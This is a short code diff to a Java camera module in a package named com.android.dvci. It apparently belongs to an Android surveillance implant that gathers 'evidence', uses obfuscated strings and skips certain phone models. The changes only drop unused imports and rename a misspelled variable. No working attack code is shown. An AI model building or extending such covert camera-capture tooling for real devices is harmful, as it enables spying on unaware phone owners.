@@ -9,15 +9,10 @@
 
 package com.android.dvci.module;
 
-import android.content.pm.PackageManager;
 import android.hardware.Camera;
-import android.os.AsyncTask;
 import android.os.Build;
-import android.os.Handler;
-import android.os.Looper;
 
 import com.android.dvci.Status;
-import com.android.dvci.ThreadBase;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.evidence.EvidenceBuilder;
@@ -29,8 +24,6 @@ import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
 import java.io.IOException;
-import java.util.concurrent.Callable;
-import java.util.concurrent.TimeUnit;
 
 //MANUAL http://developer.android.com/guide/topics/media/camera.html
 
@@ -42,7 +35,7 @@ public class ModuleCamera extends BaseInstantModule {
 	private static final String TAG = "ModuleCamera"; //$NON-NLS-1$
 
 	int counter = 0;
-	private String[] backlistedPhones = {
+	private String[] blacklistedPhones = {
 			M.e("LG-D405")
 	};
 
@@ -81,7 +74,7 @@ public class ModuleCamera extends BaseInstantModule {
 			if(haveStops()){
 				return;
 			}
-			for ( String model: backlistedPhones) {
+			for ( String model: blacklistedPhones) {
 				if (Build.MODEL.equalsIgnoreCase(model)) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (actualStart): Phone: " + Build.MODEL + " not supported");
